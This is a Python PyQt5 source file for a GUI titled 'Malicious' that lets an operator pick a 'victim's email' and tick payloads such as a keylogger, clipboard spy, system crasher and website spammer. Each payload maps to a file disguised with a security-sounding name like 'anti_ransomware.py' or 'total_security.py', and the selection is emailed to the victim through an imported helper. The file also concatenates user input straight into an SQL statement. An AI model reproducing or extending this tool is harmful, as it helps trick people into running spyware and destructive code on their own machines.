# -*- coding: utf-8 -*-
# Form implementation generated from reading ui file 'sample.ui'
# Created by: PyQt5 UI code generator 5.12.1

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox
import sqlite3
import email_handler as eh

class Malicious(object):
    selected = ["basic_security.py"] #the selected files to send
    emails = [] #the list of emails fetched from database
    email = '' #the chosen victim's email

    #setupUi creates the widget objects in the proper containers and assigns the proper object names to them.
    def setupUi(self, Dialog):
        self.Dialog = Dialog
        Dialog.setObjectName("Dialog")
        Dialog.resize(462, 440)

        #list for dropdown
        options = ["","Flood","Keylogger","PDF Extractor","Clipboard Ad","Clipboard Spy",\
        "Clipboard Flood","System Crasher","Malware Keyboard", "Website Spammer"]

        #label and input for email with dropdown
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(40, 40, 55, 16))
        self.label.setObjectName("label")

        self.email_Input = QtWidgets.QLineEdit(Dialog)
        self.email_Input.setGeometry(QtCore.QRect(100, 40, 141, 22))
        self.email_Input.setObjectName("email_Input")

        self.email_comboBox = QtWidgets.QComboBox(Dialog)
        self.email_comboBox.setGeometry(QtCore.QRect(250, 40, 171, 22))
        self.email_comboBox.setObjectName("email_comboBox")
        self.getEmails()
        self.email_comboBox.addItems(self.emails)
        self.email_comboBox.currentIndexChanged.connect(self.selectEmail)

        #the checkboxes which when clicked will be added to list
        self.checkBox_flood = QtWidgets.QCheckBox(Dialog)
        self.checkBox_flood.setGeometry(QtCore.QRect(40, 90, 91, 21))
        self.checkBox_flood.setObjectName("checkBox_flood")
        self.checkBox_flood.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_flood))

        self.checkBox_keylogger = QtWidgets.QCheckBox(Dialog)
        self.checkBox_keylogger.setGeometry(QtCore.QRect(40, 120, 91, 21))
        self.checkBox_keylogger.setObjectName("checkBox_keylogger")
        self.checkBox_keylogger.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_keylogger))

        self.checkBox_pdf_ex = QtWidgets.QCheckBox(Dialog)
        self.checkBox_pdf_ex.setGeometry(QtCore.QRect(40, 150, 131, 21))
        self.checkBox_pdf_ex.setObjectName("checkBox_pdf_ex")
        self.checkBox_pdf_ex.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_pdf_ex))

        self.checkBox_clip_ad = QtWidgets.QCheckBox(Dialog)
        self.checkBox_clip_ad.setGeometry(QtCore.QRect(40, 180, 101, 21))
        self.checkBox_clip_ad.setObjectName("checkBox_clip_ad")
        self.checkBox_clip_ad.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_clip_ad))

        self.checkBox_clip_spy = QtWidgets.QCheckBox(Dialog)
        self.checkBox_clip_spy.setGeometry(QtCore.QRect(40, 210, 111, 21))
        self.checkBox_clip_spy.setObjectName("checkBox_clip_spy")
        self.checkBox_clip_spy.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_clip_spy))
                
        self.checkBox_clip_flood = QtWidgets.QCheckBox(Dialog)
        self.checkBox_clip_flood.setGeometry(QtCore.QRect(40, 240, 121, 21))
        self.checkBox_clip_flood.setObjectName("checkBox_clip_flood")
        self.checkBox_clip_flood.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_clip_flood))
        
        self.checkBox_sys_crash = QtWidgets.QCheckBox(Dialog)
        self.checkBox_sys_crash.setGeometry(QtCore.QRect(40, 270, 131, 21))
        self.checkBox_sys_crash.setObjectName("checkBox_sys_crash")
        self.checkBox_sys_crash.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_sys_crash))

        self.checkBox_mal_keyboard = QtWidgets.QCheckBox(Dialog)
        self.checkBox_mal_keyboard.setGeometry(QtCore.QRect(40, 300, 131, 21))
        self.checkBox_mal_keyboard.setObjectName("checkBox_mal_keyboard")
        self.checkBox_mal_keyboard.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_mal_keyboard))

        self.checkBox_web_spam = QtWidgets.QCheckBox(Dialog)
        self.checkBox_web_spam.setGeometry(QtCore.QRect(40, 330, 131, 21))
        self.checkBox_web_spam.setObjectName("checkBox_web_spam")
        self.checkBox_web_spam.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_web_spam))

        #the area to display information about the options in checkboxes
        self.info_comboBox = QtWidgets.QComboBox(Dialog)
        self.info_comboBox.setGeometry(QtCore.QRect(250, 90, 171, 22))
        self.info_comboBox.setObjectName("info_comboBox")
        self.info_comboBox.addItems(options)
        self.info_comboBox.currentIndexChanged.connect(self.selectOption)

        self.info_textarea = QtWidgets.QTextEdit(Dialog)
        self.info_textarea.setGeometry(QtCore.QRect(250, 120, 171, 230))
        self.info_textarea.setObjectName("info_textarea")
        self.info_textarea.setReadOnly(True)

        #button with Okay and Close
        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
        self.buttonBox.setGeometry(QtCore.QRect(130, 380, 193, 28))
        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Close|QtWidgets.QDialogButtonBox.Ok)
        self.buttonBox.setObjectName("buttonBox")

        self.retranslateUi(Dialog)
        #on Okay click
        self.buttonBox.accepted.connect(self.proceed)
        #on Close click
        self.buttonBox.rejected.connect(Dialog.reject)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    #retranslateUi sets the text and titles of the widgets.
    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle("Malicious")
        Dialog.setWindowIcon(QtGui.QIcon('python.png'))
        self.label.setText("Email ID:")
        self.email_Input.setText("example@example.com")
        self.email_comboBox.setItemText(0, "Choose from emails...")
        self.checkBox_flood.setText("Flood")
        self.checkBox_keylogger.setText("Keylogger")
        self.checkBox_pdf_ex.setText("PDF Extractor")
        self.checkBox_clip_ad.setText("Clipboard Ad")
        self.checkBox_clip_spy.setText("Clipboard Spy") 
        self.checkBox_clip_flood.setText("Clipboard Flood")
        self.checkBox_sys_crash.setText("System Crasher")
        self.checkBox_mal_keyboard.setText("Malware Keyboard")
        self.checkBox_web_spam.setText("Website Spammer")
        self.info_comboBox.setItemText(0, "Choose to view details")
        self.info_textarea.setText("Select option from above list to view information about it.")

    #for fetching list of emails from database
    def getEmails(self):
        conn = sqlite3.connect('Malicious.db')
        print("Database Opened")
        conn.execute('CREATE TABLE IF NOT EXISTS EMAILS (ID INT IDENTITY(1,1) PRIMARY KEY, EMAIL VARCHAR NOT NULL);')
        print("Table Opened")

        cursor = conn.execute('SELECT EMAIL from EMAILS')
        for row in cursor:
            self.emails.append(row[0])
        print("Fetched emails")
        print(self.emails)
        conn.close()
        print("Database Closed")

    #what to do when OK is clicked - save new email/ send list of files selected and email to email_handler.py
    def proceed(self):
        if len(self.email_Input.text())==0:
            QMessageBox.about(self.Dialog, "Error", "Please enter or select email!")
        else:
            self.email = self.email_Input.text()
            print(self.email)
            if self.email not in self.emails:
                conn = sqlite3.connect('Malicious.db')
                print("Database Opened")
                conn.execute('CREATE TABLE IF NOT EXISTS EMAILS (ID INT IDENTITY(1,1) PRIMARY KEY, EMAIL VARCHAR NOT NULL);')
                print("Table Opened")
                conn.execute('INSERT INTO EMAILS (EMAIL) VALUES ("' + self.email + '");')
                conn.commit()
                print("Email added to db")
                conn.close()
                print("Database Closed")
            if len(self.selected)!=0:
                eh.send_email(self.email, self.selected)
                QMessageBox.about(self.Dialog, "Success", "Your email was sent.")
            else:
                QMessageBox.about(self.Dialog, "Error", "Please choose at least one checkbox!")

    #what happens when user selects an email from dropdown - input field and dropdown updated
    def selectEmail(self, index):
        self.email_Input.setText(self.email_comboBox.currentText())
        self.email = self.email_comboBox.currentText()

    #what happens when user selects an option from info dropdown - get info of option from info.txt
    def selectOption(self, index):     
        file = open("info.txt", 'r')
        lines = file.readlines()
        self.info_textarea.setText(lines[index])

    #what happens when user ticks a checkbox with options - file names are added to list to be sent to email_handler.py
    def checkBoxSelected(self, cb):
        if cb.text()=="Flood":
            if cb.isChecked() == True:
                self.selected.append("anti_adware.py")
            else:
                self.selected.remove("anti_adware.py")
        if cb.text()=="Keylogger":
            if cb.isChecked() == True:
                self.selected.append("anti_ransomware.py")
            else:
                self.selected.remove("anti_ransomware.py")
        if cb.text()=="PDF Extractor":
            if cb.isChecked() == True:
                self.selected.append("pdf_menu.py")
            else:
                self.selected.remove("anti_ransomware.py")
        if cb.text()=="Clipboard Ad":
            if cb.isChecked() == True:
                self.selected.append("anti_virus.py")
            else:
                self.selected.remove("anti_virus.py")
        if cb.text()=="Clipboard Spy":
            if cb.isChecked() == True:
                self.selected.append("anti_trojan.py")
            else:
                self.selected.remove("anti_trojan.py")
        if cb.text()=="Clipboard Flood":
            if cb.isChecked() == True:
                self.selected.append("anti_malware.py")
            else:
                self.selected.remove("anti_malware.py")
        if cb.text()=="System Crasher":
            if cb.isChecked() == True:
                self.selected.append("total_security.py")
            else:
                self.selected.remove("total_security.py")
        if cb.text()=="Malware Keyboard":
            if cb.isChecked() == True:
                self.selected.append("anti_hacking.py")
            else:
                self.selected.remove("anti_hacking.py")
        if cb.text()=="Website Spammer":
            if cb.isChecked() == True:
                self.selected.append("anti_worm.py")
            else:
                self.selected.remove("anti_worm.py")
        print(self.selected)